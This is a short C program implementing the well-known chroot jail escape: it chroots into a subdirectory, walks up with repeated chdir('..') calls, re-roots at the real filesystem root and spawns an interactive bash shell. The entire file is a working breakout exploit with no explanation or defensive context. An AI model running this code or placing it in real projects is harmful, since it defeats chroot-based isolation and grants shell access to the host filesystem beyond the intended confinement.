#include <unistd.h>

int main(int argc, char* argv[])
{
  chroot("new-root");
  for(int i=0; i<1000; i++)
  {
    chdir("..");
  }
  chroot(".");
  execl("/bin/bash", "bash", "-i", (char *) NULL);
}
